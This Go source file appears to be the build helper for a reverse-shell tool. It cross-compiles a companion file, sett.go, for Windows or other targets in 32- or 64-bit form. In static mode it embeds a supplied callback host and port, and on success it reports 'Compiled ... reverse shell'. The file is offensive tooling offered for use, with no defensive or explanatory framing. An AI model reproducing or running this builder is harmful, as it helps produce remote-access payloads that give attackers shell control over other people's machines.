package main

import (
	"fmt"
	"os"
	"os/exec"
)

func main() {
	if len(os.Args) < 4 {
		fmt.Println("Usage: compile <static|dynamic> <os> <arch> [host] [port]")
		os.Exit(1)
	}

	mode := os.Args[1]
	targetOS := os.Args[2]
	targetArch := os.Args[3]
	var host, port string

	if mode == "static" {
		if len(os.Args) < 6 {
			fmt.Println("Static mode requires host and port arguments.")
			os.Exit(1)
		}
		host = os.Args[4]
		port = os.Args[5]
	}

	var outputName string
	if targetArch == "amd64" {
		outputName = "sett64"
	} else if targetArch == "386" {
		outputName = "sett32"
	} else {
		fmt.Println("Unsupported architecture. Use 'amd64' or '386'.")
		os.Exit(1)
	}
	if targetOS == "windows" {
		outputName += ".exe"
	}

	env := append(os.Environ(), "GOOS="+targetOS, "GOARCH="+targetArch)

	var cmd *exec.Cmd
	if mode == "static" {
		cmd = exec.Command("go", "build", "-ldflags", fmt.Sprintf("-X main.host=%s -X main.port=%s", host, port), "-o", outputName, "sett.go")
	} else {
		cmd = exec.Command("go", "build", "-o", outputName, "sett.go")
	}

	cmd.Env = env
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	err := cmd.Run()
	if err != nil {
		fmt.Printf("Error building for %s/%s: %v\n", targetOS, targetArch, err)
		os.Exit(1)
	}

	fmt.Printf("Compiled %s reverse shell: %s\n", mode, outputName)
}
